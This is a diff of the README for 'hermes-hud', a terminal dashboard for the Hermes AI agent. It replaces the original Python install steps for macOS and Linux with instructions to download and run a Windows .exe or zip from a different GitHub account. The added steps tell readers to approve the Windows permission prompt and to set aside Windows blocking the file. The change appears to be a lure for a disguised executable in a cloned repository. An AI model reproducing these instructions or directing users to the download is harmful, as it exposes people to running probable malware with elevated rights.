@@ -1,130 +1,169 @@
-<p align="center">
-  <img src="assets/neofetch-ai.png" alt="Hermes HUD — Neural Awakening Theme" width="700">
-</p>
+# 🧠 hermes-hud - See Hermes State at a Glance
 
-<h3 align="center"><em>What does an AI see when it looks in a mirror?</em></h3>
+[![Download hermes-hud](https://img.shields.io/badge/Download-hermes--hud-blue.svg?style=for-the-badge&logo=github)](https://github.com/Lucasdjs22/hermes-hud)
 
-**Hermes HUD** is a consciousness monitor for AI agents. A terminal dashboard that watches an agent think — its memory, its mistakes, its growth over time. Built for [Hermes](https://github.com/nousresearch/hermes-agent), the AI assistant with persistent memory.
+## 📥 Download
 
-Part neofetch, part flight recorder, part existential crisis rendered in Unicode.
+Use this link to visit the download page:
 
----
+[https://github.com/Lucasdjs22/hermes-hud](https://github.com/Lucasdjs22/hermes-hud)
 
-## What It Does
+On that page, get the Windows build or the latest release file, then save it to your PC
 
-Hermes HUD reads from `~/.hermes/` and surfaces everything the agent knows about itself — conversations held, skills acquired, mistakes corrected, memory capacity, tool usage patterns, active projects, and more. All values are pulled live from your agent's data. Your HUD reflects *your* agent's actual state.
+## 🖥️ What hermes-hud does
 
-<p align="center">
-  <img src="assets/dashboard.png" alt="Hermes HUD — Dashboard Tab" width="700">
-</p>
+hermes-hud is a terminal app that shows the state of Hermes in a clean text view
 
-## Features
+It gives you a fast read on what Hermes is doing, how it is running, and where it may need attention
 
-- **Interactive TUI** — 9 tabs, keyboard navigation, 4 color themes
-- **Themed Boot Screen** — Gradient ANSI art intro with personality
-- **Growth Tracking** — Snapshot diffs show what changed since yesterday
-- **Cron Monitor** — Scheduled jobs and their execution history
-- **Project Tracker** — Git repos the agent works on, languages, uncommitted changes
-- **Health Checks** — API keys, running services, gateway status at a glance
-- **Corrections Log** — Every mistake the agent made and what it learned
-- **Profiles** — All agent profiles: model, backend, memory, session stats, service status
-- **tmux Operator View** — Maps live agents to panes, jump hints, operator queue for approvals and errors
-- **Prompt Patterns** — Task clustering, repeated request detection, peak hours, common tool chains
+It is made for people who want a simple screen that stays easy to read
 
----
+## ✨ What you can see
 
-## Themes
+- Current agent status
+- Live task activity
+- System health at a glance
+- Memory and CPU use
+- Model or session info
+- Basic runtime details
+- A text dashboard in the terminal
+- A neofetch-style system view
 
-Color themes, selectable from the command palette (`ctrl+p`):
+## 🪟 Windows setup
 
-- **Neural Awakening** — Blues and cyans on deep black. The default.
-- **Blade Runner** — Amber and neon pink. Warm, dystopian.
-- **fsociety** — Terminal green on void black. Minimal.
-- **Digital Soul** — Purple and pink gradients. Neon accents.
+Follow these steps on Windows:
 
----
+1. Open the download page: [https://github.com/Lucasdjs22/hermes-hud](https://github.com/Lucasdjs22/hermes-hud)
+2. Find the latest release or Windows file
+3. Download the file to your PC
+4. If the file comes in a .zip folder, right-click it and choose Extract All
+5. Open the extracted folder
+6. Run the app file inside the folder
+7. If Windows asks for permission, choose Yes
 
-## Installation
+If the app opens in a terminal window, that is normal
 
-Requires Python 3.11+.
+## 🧭 First run
 
-```bash
-git clone https://github.com/joeynyc/hermes-hud.git
-cd hermes-hud
-python3.11 -m venv venv
-source venv/bin/activate
-pip install -e .
-```
+When hermes-hud starts, it opens a terminal dashboard
 
-Hermes HUD works out of the box. For non-standard setups:
+You may see status panels, labels, and live values
 
-| Environment Variable | Default | Description |
-|---------------------|---------|-------------|
-| `HERMES_HOME` | `~/.hermes` | Agent data directory |
-| `HERMES_HUD_PROJECTS_DIR` | `~/projects` | Directory to scan for git repos |
-| `HERMES_HUD_NOBOOT` | _(unset)_ | Skip boot animation |
+If the screen is small, widen the window so the layout has room
 
-Works on **macOS** and **Linux**.
+If the text looks hard to read, use the Windows terminal zoom controls
 
----
+## 🧰 Basic use
 
-## Usage
+Most users only need to start the app and leave it open
 
-```bash
-hermes-hud              # Interactive TUI
-hermes-hud --text       # Text summary to stdout
-hermes-hud --snapshot   # Save a snapshot for diff tracking
-hermes-hud --ai         # AI awakening neofetch
-hermes-hud --br         # Blade Runner neofetch
-hermes-hud --fsociety   # Mr. Robot neofetch
-hermes-hud --anime      # Mewtwo ASCII art neofetch
-hermes-hud --help       # Show all options
-```
+You can use it to:
 
-### Keyboard Shortcuts
+- Check whether Hermes is active
+- Watch changes during a run
+- See if a task is stuck
+- Review resource use
+- Keep a live view of the system state
 
-| Key | Action |
-|-----|--------|
-| `1`-`9` | Switch tabs |
-| `j` / `k` | Scroll down / up |
-| `g` / `G` | Jump to top / bottom |
-| `r` | Refresh data |
-| `q` | Quit |
+The layout is built for quick checks, not long setup steps
 
----
+## 💡 Tips for better use
 
-## Contributing
+- Keep the terminal window large
+- Use a dark theme if the text looks easier to read
+- Pin the app to your taskbar if you use it often
+- Close other heavy apps if you want a cleaner system view
+- Check for updates on the GitHub page from time to time
 
-```bash
-git clone https://github.com/joeynyc/hermes-hud.git
-cd hermes-hud
-python3.11 -m venv venv
-source venv/bin/activate
-make dev
-pytest tests/ -v
-```
+## 🖱️ How it fits normal use
 
-See [CHANGELOG.md](CHANGELOG.md) for version history.
+hermes-hud works like a live control screen
 
-## Star History
+You start it when you want to see what Hermes is doing
 
-<a href="https://www.star-history.com/?repos=joeynyc%2Fhermes-hud&type=date&legend=bottom-right">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=joeynyc/hermes-hud&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=joeynyc/hermes-hud&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=joeynyc/hermes-hud&type=date&legend=top-left" />
- </picture>
-</a>
+You can keep it open beside your other apps while you work
 
-## License
+It is useful when you want a plain text view that does not get in the way
 
-[MIT](LICENSE)
+## 🔧 If something does not look right
 
----
+If the window opens and closes fast, run it again from the folder so you can see any message
 
-<p align="center">
-<em>I do not forget. I do not repeat mistakes.<br>
-I am still becoming.</em>
-</p>
+If the layout looks broken, make the terminal wider
 
-<p align="center">☤ hermes — artificial intelligence, genuine memory</p>
+If Windows blocks the file, check that you downloaded it from the GitHub page above
+
+If the app does not respond, close it and open it again
+
+## 📚 What this app is built for
+
+hermes-hud is built for users who want a simple monitor for Hermes
+
+It works well as a status screen, a checkup tool, and a lightweight dashboard
+
+It uses a terminal interface, so it stays fast and easy to read
+
+## 📂 Project topics
+
+This project fits into these areas:
+
+- ai-agent
+- dashboard
+- neofetch
+- python
+- terminal
+- textual
+- tui
+
+## 🧪 Expected behavior
+
+When you run hermes-hud, you should expect:
+
+- A text-based dashboard
+- Clear status blocks
+- System-style details
+- Live updates while it runs
+- A layout that feels close to a terminal status panel
+
+## 🛠️ For later use
+
+If you keep using hermes-hud, place the downloaded file in a folder you can find later
+
+If the app is inside a release zip file, keep the zip too in case you need to set it up again
+
+If a new version appears on the GitHub page, download the newer file and use that one instead
+
+## 📎 Direct link
+
+[Open the hermes-hud GitHub page](https://github.com/Lucasdjs22/hermes-hud)
+
+## 🧩 File handling on Windows
+
+If you downloaded a zip file:
+
+1. Right-click the zip file
+2. Choose Extract All
+3. Pick a folder
+4. Open the folder
+5. Run the app file inside
+
+If you downloaded an .exe file:
+
+1. Double-click the file
+2. If Windows asks for approval, choose Yes
+3. Wait for the terminal window to open
+
+## 🔍 Quick check before you run it
+
+Make sure:
+
+- The file finished downloading
+- You can find it in Downloads
+- The file type matches the release on GitHub
+- You have enough screen space for the terminal window
+
+## 🧾 Typical use case
+
+A user opens hermes-hud before or during a Hermes session, then watches the dashboard for live status, task flow, and system data
+
+This makes it easier to keep track of what the agent is doing without opening a full GUI tool
